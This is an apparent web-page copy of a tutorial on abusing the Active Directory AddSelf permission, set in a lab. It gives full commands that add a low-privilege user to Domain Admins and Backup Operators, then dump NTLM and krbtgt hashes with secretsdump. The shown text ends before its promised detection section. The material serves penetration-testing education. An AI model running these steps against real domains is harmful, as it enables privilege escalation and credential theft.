@@ -1,0 +1,265 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/dacl-attacks/" rel="category tag">DACL Attacks</a></span>            </div>
+            <h1 class="post-title entry-title">Abusing AD-DACL: AddSelf</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/addself-active-directory-abuse/" rel="bookmark"><time class="entry-date published" datetime="2025-01-08T16:16:59+00:00">January 8, 2025</time><time class="updated" datetime="2025-06-19T13:23:05+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p data-start="159" data-end="642"><span style="color: #000000">This post explores <strong data-start="184" data-end="218">AddSelf Active Directory abuse</strong>, a common misconfiguration involving <strong data-start="256" data-end="301">Discretionary Access Control Lists (DACL)</strong>. Specifically, by exploiting the <strong data-start="339" data-end="361">AddSelf permission</strong>, attackers can escalate privileges by adding themselves to privileged groups like Domain Admins or Backup Operators. As a result, they gain administrative control, move laterally within the network, access sensitive systems, and maintain persistence.</span></p>
+<p data-start="644" data-end="865"><span style="color: #000000">Moreover, attackers can perform <strong data-start="680" data-end="705">Kerberoasting attacks</strong> to steal <strong data-start="715" data-end="730">credentials</strong> or gain control over backup data, potentially leading to a full domain takeover if the abuse goes undetected and unremediated.</span></p>
+<p><span style="color: #000000">The <strong data-start="876" data-end="889">lab setup</strong> required to simulate these attacks includes methods mapped to the <strong data-start="956" data-end="982">MITRE ATT&amp;CK framework</strong>, which helps clarify the associated techniques and tactics. This post also covers detection mechanisms to identify suspicious activities linked to <strong data-start="1154" data-end="1173">AddSelf attacks and</strong> actionable recommendations to mitigate these vulnerabilities. Ultimately, this overview equips security professionals with critical insights to recognize and defend against these prevalent threats.</span></p>
+<h3><span style="color: #800000">Table of Contents</span></h3>
+<p style="padding-left: 40px"><strong><span style="color: #000000">AddSelf Permission</span></strong></p>
+<p style="padding-left: 40px"><strong><span style="color: #000000">Prerequisites</span></strong></p>
+<p style="padding-left: 40px"><span style="color: #000000"><strong>Lab Setup</strong> – User Owns AddSelf Permission on the Domain Admins Group</span></p>
+<p style="padding-left: 40px"><span style="color: #000000"><strong>Exploitation Phase I</strong> – AddSelf Abuse on Domain Admins Group</span></p>
+<p style="padding-left: 40px"><span style="color: #000000"><strong>Bloodhound</strong> – Hunting for Weak Permissions</span></p>
+<p style="padding-left: 40px"><span style="color: #000000"><strong>Method for Exploitation</strong> – Account Manipulation (T1098)</span></p>
+<ul>
+<li style="list-style-type: none">
+<ul>
+<li><span style="color: #000000">Linux Bloody AD</span></li>
+<li>Net RPC</li>
+<li><span style="color: #000000">Linux Ldap_shell</span></li>
+<li><span style="color: #000000">Windows PowerShell – Powerview</span></li>
+<li><span style="color: #000000">Windows PowerShell – Active Directory module</span></li>
+</ul>
+</li>
+</ul>
+<p style="padding-left: 40px"><span style="color: #000000"><strong>Post Exploitation</strong> – Dumping hashes with Impacket</span></p>
+<p style="padding-left: 40px"><span style="color: #000000"><strong>Lab Setup</strong> – User Owns AddSelf Permission on the Backup Operators Group</span></p>
+<p style="padding-left: 40px"><span style="color: #000000"><strong>Exploitation Phase II</strong> – User Owns AddSelf Permission on the Backup Operators Group</span></p>
+<p style="padding-left: 40px"><span style="color: #000000"><strong>Bloodhound</strong> – Hunting for Weak Permissions</span></p>
+<p style="padding-left: 40px"><span style="color: #000000"><strong>Method for Exploitation</strong> – Account Manipulation (T1098)</span></p>
+<ul>
+<li style="list-style-type: none">
+<ul>
+<li><span style="color: #000000">Linux adduserstogroup tool</span></li>
+</ul>
+</li>
+</ul>
+<p style="padding-left: 40px"><span style="color: #000000"><strong>Post Exploitation</strong> – Dumping hashes with Impacket</span></p>
+<p style="padding-left: 40px"><strong><span style="color: #000000">Alternate method of dumping hashes with Impacket</span></strong></p>
+<p style="padding-left: 40px"><strong><span style="color: #000000">Detection &amp; Mitigation</span></strong></p>
+<h3><span style="color: #800000">AddSelf Permission</span></h3>
+<p><span style="color: #000000">The <strong>AddSelf</strong> permission in Active Directory allows users to add themselves to the target security group. Because of security group delegation, the members of a security group have the same privileges as that group.</span></p>
+<p><span style="color: #000000">By adding yourself to a group and refreshing your token, you gain all the same privileges that the group has.</span></p>
+<p><span style="color: #000000">The impact of <strong>AddSelf DACL abuse</strong> can vary based on the group that is abused. Below is a breakdown of the potential impact from an attacker’s perspective:</span></p>
+<h3><span style="color: #800000">Prerequisites</span></h3>
+<ul>
+<li><span style="color: #000000">Windows Server 2019 as Active Directory</span></li>
+<li><span style="color: #000000">Kali Linux</span></li>
+<li><span style="color: #000000">Tools: Bloodhound, Net RPC, Powerview, BloodyAD, Ldap_Shell, Impacket</span></li>
+<li><span style="color: #000000">Windows 10/11 – As Client</span></li>
+</ul>
+<h3><span style="color: #800000">Lab Setup – User Owns AddSelf Permission on the Domain Admin Group</span></h3>
+<p><span style="color: #000000"><strong>Create the AD Environment:</strong></span></p>
+<p><span style="color: #000000">To simulate an Active Directory environment, you will need a Windows Server as a Domain Controller (DC) and a client machine (Windows or Linux) where you can run enumeration and exploitation tools.</span></p>
+<p><span style="color: #000000"><strong>Domain Controller</strong>:</span></p>
+<ul>
+<li><span style="color: #000000">Install Windows Server (2016 or 2019 recommended).</span></li>
+<li><span style="color: #000000">Promote it to a Domain Controller by adding the <strong>Active Directory Domain Services.</strong></span></li>
+<li><span style="color: #000000">Set up the domain (e.g., <strong>local</strong>).</span></li>
+</ul>
+<p><span style="color: #000000"><strong>User Accounts</strong>:</span></p>
+<ul>
+<li><span style="color: #000000">Create a standard user account named<strong> Shreya</strong>.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user shreya Password@1 /add /domain</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_k5WLJ0lO1ElZEoPO97uqPhMgIYpbeLuN9MsUnScZl-RIst_tErOpqHrbxJUAGaV6IoM-LdFNRxaRuCmzieaY4Lzpa82BV8n1IJlN18UJrAIs3dBaXTC5aJhMhkMHrwDzCua_kyQf3pnkkluJd4SjF6QXMqt1QWlnSHMTyAKGN9VBe73GX39Ey8xMMNgX/s16000/1.png"/></span></p>
+<ul>
+<li><span style="color: #000000"><strong>Assign the “AddSelf” Privilege to Shreya:</strong></span></li>
+<li data-start="160" data-end="307"><span style="color: #000000">Firstly, once your <strong data-start="183" data-end="201">AD environment</strong> is set up, you need to assign the <strong data-start="236" data-end="259">“AddSelf” privilege</strong> to <strong data-start="263" data-end="273">Shreya</strong> for the <strong data-start="282" data-end="305">Domain Admins group</strong>.</span></li>
+<li data-start="309" data-end="406"><span style="color: #000000">To begin, open <strong data-start="328" data-end="375">Active Directory Users and Computers (ADUC)</strong> on the <strong data-start="383" data-end="404">Domain Controller</strong>.</span></li>
+<li data-start="408" data-end="501"><span style="color: #000000">Next, enable the <strong data-start="429" data-end="455">Advanced Features view</strong> by clicking on <strong data-start="471" data-end="499">View &gt; Advanced Features</strong>.</span></li>
+<li data-start="503" data-end="585"><span style="color: #000000">Afterward, locate the <strong data-start="529" data-end="552">Domain Admins group</strong> within the <strong data-start="564" data-end="583">Users container</strong>.</span></li>
+<li data-start="587" data-end="659"><span style="color: #000000">Finally, right-click on <strong data-start="615" data-end="632">Domain Admins</strong> and select <strong data-start="644" data-end="658">Properties</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhNRzzOPePQYTOOy0mzWcE9NwnawJnyUof4av7mf-HlhgrMTyvXRyxgJqZYRYNaLjFRAl6fuL2MJi1fypQA9ag0mvEiNcIOzuPMcaJspqTVvsvPBjcB9HZXcTsuScwWKq1IgVRj4MfPO2jf9-y5O8h5Oql7C4STrsfd7aeXm-aziCbXZrLJvn710EoWEasu/s16000/2.png"/></span></p>
+<ul>
+<li><span style="color: #000000">Go to the <strong>Security</strong> tab, and click on the <strong>Add</strong> button.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNReCSr23BzvneY1S1TYsjHeujSTP-NfLHi3pQwP05URiCMnYPsDHiYz7CBkxsXgOFvFinetrHmwEwduwkaanCE50TrM1JOOb7HaVRX__eB80OXUgINOLEJESjPSLDgqzJxtuWKhLryFfTHngQeiZ2pI-xgMjvnA_okLwcrjilKeNDqcYJvlvn9kJsTE-0/s16000/3.png"/></span></p>
+<ul>
+<li><span style="color: #000000">In the “Enter the object name to select” box, type <strong>Shreya</strong> and click <strong>Check Names, </strong>and click OK.</span></li>
+<li><span style="color: #000000">Select the <strong>Shreya </strong>user and in the <strong>Permissions</strong> section, click on the <strong>Advanced</strong> option.</span></li>
+<li><span style="color: #000000">In the <strong>Advanced security settings </strong>box, double-click on <strong>Shreya</strong> user’s permission entry.</span></li>
+<li><span style="color: #000000">In the <strong>Permissions</strong> section, check the box for <strong>Add/remove self as member permission</strong> rights.</span></li>
+<li><span style="color: #000000">Apply the settings.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjt7YEq25BhHURA2z_LUnuceG7mxOY1K1MPv_NW4DiEjpgPGd7FyW1m8zC27iCs-l57uZ4nP5gRVvPQ-aVCTBKdbgwxjCUvZwEHeuFkFq5136zZdHLljgYRb8besgLV4Kj3CK2AUi-m_vjzXDRmKaL6UfpSanhN8LWCEEDTg-Xe2DLgj7zca3ElmUiU9dnL/s16000/5.png"/></span></p>
+<p><span style="color: #000000">At this point, <strong>Shreya</strong> now has <strong>AddSelf </strong>rights over the <strong>Domain Admins</strong> group, meaning they can add themselves to the Domain Admins group.</span></p>
+<h3><span style="color: #800000">Exploitation Phase I – AddSelf Abuse on Domain Admins Group<br/>
+</span></h3>
+<h3><span style="color: #800000">Bloodhound – Hunting for Weak Permissions</span></h3>
+<p><span style="color: #000000"><strong>Use BloodHound to Confirm Privileges</strong>: You can use <strong>BloodHound</strong> to verify that <strong>Shreya</strong> has the <strong>AddSelf</strong> permission on the <strong>Domain Admins</strong> group.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodhound-python -u shreya -p Password@1 -ns 192.168.1.48 -d ignite.local -c All</pre>
+<p><span style="color: #000000"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCW40O5uBgf6S8LpVvs5JKuN5b8nz-noCi5kAVQw-6cMlhSSua4gduMcR9oK_46FBeqXGEa1W9iBWbKIZJ1mbVjz4WH0oWHtwTx116V3xhw4EafghswPee4qHE8u9wckeD1xIrjMLmAC9oI82YZsZ6PbopTdU-UKrC6ycf4Z0ecIAA10aIOl5iaN85BOEZ/s16000/6.png" alt="AddSelf Active Directory Abuse" width="918" height="520"/></span></p>
+<p><span style="color: #000000">From the graphical representation of Bloodhound, the tester would like to identify the outbound object control for the selected user where the first degree of object control value is equal to 1.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMcOR4Dbpz5BK41Rl9y1mkw2CtBvFeql0MULZiNpeOtXRI1rJa1PSCTM8ghpuH6rs3yU-W8ZIhjOK7GAKbYgn9y_ESWPNqfni31RZeICpi9PuidBurW5nFafrexcz1CJ-VG5mG2DVB6_tkFGvlSMBBBjmqYyEGAWrYFXKzgQbzP2GSbxZrZQ2Bngbj0SfU/s16000/7.png"/></span></p>
+<p><span style="color: #000000">Thus, it has been shown that the Shreya User has the AddSelf privilege in the Domain Admin group.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgFEhWX7UbhFylB3tgBOaFBhvpxwEaNb9h8kd8GzbJYWjgy-V4qkYWEBmhuG5iZYdDQ_FBJPbgbHQ9XJJYtSHszjB6YaWRxe3m6WXzteGYCCaLIVDkbXWB8orfxcxgISS9K3aXmqzEg9myqVNldxEEqFvv6S-JpJX7T32-hrU9BqpWCROh-VD8z_Dc7bwVK/s16000/8.png"/></span></p>
+<p> </p>
+<h3><span style="color: #800000">Method for Exploitation – Account Manipulation (T1098)</span></h3>
+<p><span style="color: #000000"><strong>Linux Bloody AD</strong></span></p>
+<p><span style="color: #000000">It can be achieved using <span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/CravateRouge/bloodyAD"><strong>bloodyAD</strong></a></span></span></p>
+<p><span style="color: #000000">The tester can abuse this permission by adding Shreya User to the Domain Admin group and listing the domain admin members to ensure that Shreya User becomes a Domain Admin.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD --host "192.168.1.48" -d "ignite.local" -u "shreya" -p "Password@1" add groupMember "Domain Admins" "shreya"</pre>
+<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjG5vDebrLAT05dftvzwpish_h5yTqWe4k7JN_p5buq7vVtyNpJtZ4_h4zepwIebuzx0X8P9SQunW3HQOsnnq7-6pK1NsLLWg6a5gOLR9iXAuGPKpwBMyeNYf8fv-CkUq8AwRzTWeU5c1POlY27TPsCTMMd4-Vn2v1pxRJ4k7uQWsTBoPuVUgfaB3MiCkOG/s16000/9.png" alt="AddSelf Active Directory Abuse" width="1281" height="85"/></span></p>
+<p><span style="color: #000000"><strong>Net RPC</strong></span></p>
+<p><span style="color: #000000">Use the net rpc to list the users in the group.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net rpc group members "Domain Admins" -U ignite.local/shreya%'Password@1' -S 192.168.1.48</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIDAIc92JFk-ls9IcGdKBgbA9OrNIqGpuTcSFuX8OK7AneVih4xUGCrmkDT7qSxUohoXIDSXRtrSv7cSUz676jaZSbSB5GHD_g7XIWUEeLmta3d85T_C0i4bowqYh4B4NWJqN6WSaK4FFKAVzLgV51qEq32SF1agi3WOLZX7a8DKojZeisc0SijXvmNBLV/s16000/10.png"/></span></p>
+<p><span style="color: #000000"><strong>Linux Ldap_shell</strong></span></p>
+<p><span style="color: #000000">Alternatively, it can be achieved using <span style="color: #0000ff"><strong><a style="color: #0000ff" href="https://github.com/PShlyundin/ldap_shell">ldap_shell</a></strong></span></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ldap_shell ignite.local/shreya:Password@1 -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-GmXdPvsGTh-APHZwZmQ2tZ5eVRjng_FVtDrBAU5ZW-TJg0C8uaosiSW_dhcIBF-2u6FkWNHPbhEt66gH6Pv9AmVmuldqA3afpymo34tpj2HFfU9EJm7LI8_qVd7A656x14UOd6Iu6QK9yqHe9uF_TPh-SZvA_DvEy9rl4i05Jpc4Qo_fncASnJ9PzOtO/s16000/11.png"/></strong></span></p>
+<p><span style="color: #000000"><strong>Windows PowerShell – Powerview</strong></span></p>
+<p><span style="color: #000000">The attacker can add a user to a group. This can be achieved with the Active Directory <strong>Add-DomainGroupMember</strong> (<span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"><strong>PowerView</strong></a> </span>module).</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -ep bypass
+Import-Module .PowerView.ps1
+Add-DomainGroupMember -Identity "Domain Admins" -Members shreya -Verbose</pre>
+<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEic8WMFJJXVH6-hGAqdiFyfk9TPMKYWWKQgYNFEu9SydzWVaHueKLDXQkfaDmPzAm6qIeLVse7DY5ZbZjuLyljvHKJm8EiZ5xbGVI-mQodrkOYqPdkTDcTvI1bjf4mTBEs5wTkxIF0c1YnyyJ-p2XZYfEbA3bQjloDQUp6AhjhfOZttbrkrTbXAO9vlDyd1/s16000/12.png" alt="AddSelf Active Directory Abuse" width="1073" height="863"/></span></p>
+<p><span style="color: #000000">Thus, from the user property, we can see that Shreya’s user has become a member of the domain admin group.</span></p>
+<p><span style="color: #000000"><strong>Windows PowerShell – Active Directory module</strong></span></p>
+<p><span style="color: #000000">The attacker can add a user to a group. This can be achieved with the <strong>Active Directory PowerShell module</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-Module -Name ActiveDirectory -ListAvailable
+Import-Module -Name ActiveDirectory
+Add-ADGroupMember -Identity 'Domain Admins' -Members 'shreya'</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNkmIqsYi562QohxWE3wVysw78IPE621XQtvxSxi_yWWz99x95nwGfyHjtMQ5V2T_dEZwNqJITiT9pw5VW8d0tk3yEbBQ_jdeGnjtl5xzU_rk18NIaXAtYUxQIWXsC3SskPWHBfvtDmyhQV8qSQjHahLARX9MpfNvMjajNIBP2bZf12Cp1940b6On917Ro/s16000/12_2.png"/></span></p>
+<h3><span style="color: #000000"><span style="color: #800000">Post Exploitation – Dumping hashes with Impacket</span> </span></h3>
+<p><span style="color: #000000">After exploiting <strong>AddSelf abuse</strong>, the compromised account was added to the <strong>Domain Admins</strong> group. With elevated privileges, <strong>NTLM hashes can be dumped</strong> from the <strong>Domain Controller</strong> using <strong>Impacket’s secretsdump</strong> tool.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-secretsdump 'ignite.local'/'shreya':'Password@1'@'192.168.1.48'</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjONMfEbPcvoQX7n0xvS5G82CwqvrozzLDRGUHJVj2s5pI1FxtCAJMFwy9tWkrXYKlhGbpFfMqJKrjfRBHJ3jmCAbjQigIkLrlBavkVqWQcu-8qNTVpt1oLYNkRdmb2kD_ZFL4uwPZw8ux_78JF1nwdhBWOIVgjWz5NvJkEN6Y72Ota-xrFgPj9Cxa0tPfg/s16000/13.png" alt="AddSelf Active Directory Abuse" width="893" height="914"/></span></p>
+<p><span style="color: #000000">This revealed <strong>Domain Admin</strong> credentials and the <strong>krbtgt</strong> hash, enabling further attacks like <strong>Golden Ticket</strong>.</span></p>
+<h3><span style="color: #800000">Lab Setup – User Owns AddSelf Permission on the Backup Operators Group</span></h3>
+<p><span style="color: #000000"><strong>Create the AD Environment:</strong></span></p>
+<p><span style="color: #000000">To simulate an Active Directory environment, you will need a Windows Server as a Domain Controller (DC) and a client machine (Windows or Linux) where you can run enumeration and exploitation tools.</span></p>
+<p><span style="color: #000000"><strong>Domain Controller</strong>:</span></p>
+<ul>
+<li><span style="color: #000000">Install Windows Server (2016 or 2019 recommended).</span></li>
+<li><span style="color: #000000">Promote it to a Domain Controller by adding the <strong>Active Directory Domain Services.</strong></span></li>
+<li><span style="color: #000000">Set up the domain (e.g., <strong>local</strong>).</span></li>
+</ul>
+<p><span style="color: #000000"><strong>User Accounts</strong>:</span></p>
+<ul>
+<li><span style="color: #000000">Create a standard user account named<strong> Aarav</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Assign the “AddSelf” Privilege to Aarav:</strong></span></p>
+<p><span style="color: #000000">Once your AD environment is set up, you need to assign the <strong>“AddSelf”</strong> privilege to <strong>Aarav </strong>for the<strong> Backup Operators </strong>group.</span></p>
+<ul>
+<li><span style="color: #000000">Open <strong>Active Directory Users and Computers</strong> (ADUC) on the Domain Controller.</span></li>
+<li><span style="color: #000000">Enable the <strong>Advanced Features</strong> view by clicking on <strong>View</strong> &gt; <strong>Advanced Features</strong>.</span></li>
+<li><span style="color: #000000">Locate the <strong>Backup Operators </strong>group in the Users container.</span></li>
+<li><span style="color: #000000">Right-click on <strong>Backup Operators </strong>and go to <strong>Properties</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj6a1wHHDa9PckhcmBERRfxhNgqExSTjYPZvdJu50u4qZpMW_6AUjg7xt0r5Gvnp_IVlYwzgzGase9kcmyDihdrzhuIn48HLX_2t4lm4WU-vuJf1WQCmelbwhs72UwGU5vFD5roBM17kvNRBJlLXOT0nXY08ZXpUr1lxS_Xywf1i5yPMuKc4GO7TpbLyC1T/s16000/14.png"/></span></p>
+<p> </p>
+<ul>
+<li><span style="color: #000000">Go to the <strong>Security </strong>tab and click on <strong>Add.</strong></span></li>
+<li><span style="color: #000000">In the “Enter the object name to select” box, type <strong>Aarav </strong>and click <strong>Check Names, </strong>and click OK.</span></li>
+<li><span style="color: #000000">Select the <strong>Aarav </strong>user and in the <strong>Permissions</strong> section and click on <strong>Advanced</strong></span></li>
+<li><span style="color: #000000">In the <strong>Advanced security settings </strong>box, double-click on the <strong>Aarav</strong> user’s permission entry.</span></li>
+<li><span style="color: #000000">In the <strong>Permissions </strong>section, check the box for <strong>Add/remove self as member permission</strong> rights.</span></li>
+<li><span style="color: #000000">Apply the settings.</span></li>
+</ul>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRC1ftDVvPilBlJ1-vEE71qB4J9smXls8lInwNQDI5mTDuUwkLaUEAIS-qDt56Xf6bIDbLZ1jTc0dlnyTGnRx7PALgj1C0EuDhQ2BnMZemOsMvi5vnugF2ZRQpqp55R3fS1fBEKGYhjspUImx78iMh1NDBqKAHWdVqzJBZEMIOdM-xb2uFnwb2XLUpNdTh/s16000/15.png" alt="AddSelf Active Directory Abuse" width="874" height="768"/></span></p>
+<p> </p>
+<p><span style="color: #000000">At this point, <strong>Aarav</strong> now has <strong>AddSelf </strong>rights over the <strong>Backup Operators </strong>group, meaning they can add themselves to the Backup Operators group.</span></p>
+<h3><span style="color: #800000">Exploitation Phase II – User Owns AddSelf Permission on the Backup Operators Group</span></h3>
+<h3><span style="color: #000000">Bloodhound – Hunting for Weak Permissions</span></h3>
+<p><span style="color: #000000"><strong>Use BloodHound to Confirm Privileges</strong>: You can use <strong>BloodHound</strong> to verify that <strong>Aarav</strong> has the <strong>AddSelf</strong> permission on the <strong>Backup Operators </strong>group.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodhound-python -u aarav -p Password@1 -ns 192.168.1.48 -d ignite.local -c All</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgkOhJonQRPxzDLeXUUlFgVvWd5v8RjGyqU7WGWRD4TEUqQRmM63sA0BBYYLPNmFOoPhRE0an-z7ShX4OqXCuhI0GNCIIiYhhxcDz-yTtnWjvm8Uowo2yHf4TUJfWiGU0-c-Q7iGa6CWzrKonBOGjf4L7vqtVLKLBTN9gYwVsRzBrxR5CvRmRK82pk9kMw7/s16000/16.png"/></span></p>
+<p><span style="color: #000000">From the graphical representation of Bloodhound, the tester would like to identify the outbound object control for the selected user where the first degree of object control value is equal to 1.</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgdhs6efzWYpTlKZKzLEBxq5_NVm75RCUhwvRhGBx7afWlJb67tlu3tr421UTngowLNtBrCFO_9D4a5SfUoTHkGkL7CXffZp8QOzhc0GSDD4NqDWRoGxcHr1pVJAbwikM70ZRDsQ8yYrL8XgQZCSFQbB5XbAeXqJ4FaxY5mnejKwqSR0e9Ha2cri4ucfZdW/s16000/17.png" alt="AddSelf Active Directory Abuse" width="486" height="690"/></span></p>
+<p><span style="color: #000000">Thus, it has been shown that the Aarav User has the AddSelf privilege in the Backup Operators group.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihPZ1m9ZZi3b4aek2Y-xkN7AdREc8oOpkrYJvYexTTeKU-Oy9uFInsDn-Ch_jvAlWk1tk8GZzVJf-I5Ai6yGA3oDnR9UFc3DY6OipQE6i7eLK4y2-VN_-JbCgDMIwMtSrvCDYHnTrcT-KzrktKea0234ckU0dfxD0-7PTLeXxsmqQmAvYvNb6V0KhX53N-/s16000/18.png"/></span></p>
+<p><span style="color: #000000">Alternatively, the above lab setup can be done using Impacket’s dacledit script.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-dacledit -principal aarav -target 'Backup Operators' -dc-ip 192.168.1.48 ignite.local/aarav:Password@1</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9K8I-Q2y-qB8BYwLPNK2VVAeOzCoCcDCm87fADpATrUAc2aaeICaSb7_5aB1bvW0LRd3TQE8c9K-_2CifkGc5RJ8yFARCAyxH2zoMCWqyjt6gQ9sD60F37_lQib0WWNAZnLBYANMxDvVhzEI5KW4kjFvIo5CGoEdCjf87eLbPfv3366GqyAHhh-PZlO1q/s16000/19.png" alt="AddSelf Active Directory Abuse" width="1225" height="408"/></span></p>
+<h3><span style="color: #800000">Method for Exploitation – Account Manipulation (T1098)</span></h3>
+<p><span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/juliourena/ActiveDirectoryScripts/blob/main/Python/addusertogroup.py"><strong>adduserstogroup</strong></a></span></p>
+<p><span style="color: #000000">Here, the tester can abuse this permission by adding the <strong>Aarav</strong> User to the <strong>Backup Operators </strong>group and listing the Backup Operators members.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 addusertogroup.py -d ignite.local -g "Backup Operators" -a aarav -u aarav -p Password@1</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgds7LKDEMBR5o06g_BWIp8X-9clKxW_ODUifCHvG0KIP50xx7LBnfkSJjVFOwIv6O_a1jESGOo6L8Mu7ayB_j4MPqK9F7jVLwMP3RBfcvXJA_jsLCXQL70dRT6XPRshZM_ChJMuRBJ7OsCXs8dcv3hAm5o9eDsUTm6con9UdQD3TRLCUe3fBD9s_2y5Lo-/s16000/22.png"/></span></p>
+<p><span style="color: #000000">Next, use net rpc to list the users in the group.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net rpc group members "Backup Operators" -U ignite.local/aarav%'Password@1' -S 192.168.1.48</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpMFDPqgFx3Resyt68m5c6jaVPpFBUkht_6F_RuR9XBHzAQWCf9UMropb8f9jTTM8LNx2LPAGJrP3y35KILDVZWBgo_Jf09caY5Vjrc0xagl8GE6D2pXX7dPcuOaWIMKrbZ4Lyst0lPA5lm0iS2ORRoB2oT6o1f5qcnVxyMwGUgmwZ-rR8-SL0ysr92645/s16000/23.png" alt="AddSelf Active Directory Abuse" width="1007" height="83"/></span></p>
+<h3><span style="color: #000000"><span style="color: #800000">Post Exploitation – Dumping hashes with Impacket</span> </span></h3>
+<p><span style="color: #000000">After exploiting <strong data-start="1427" data-end="1444">AddSelf abuse</strong>, the attacker added the <strong data-start="1469" data-end="1492">compromised account</strong> to the <strong data-start="1500" data-end="1526">Backup Operators group</strong>. Subsequently, with elevated privileges, they can dump <strong data-start="1586" data-end="1601">NTLM hashes</strong> from the <strong data-start="1611" data-end="1632">Domain Controller</strong> using <strong data-start="1639" data-end="1665">Impacket’s secretsdump</strong> tool.</span></p>
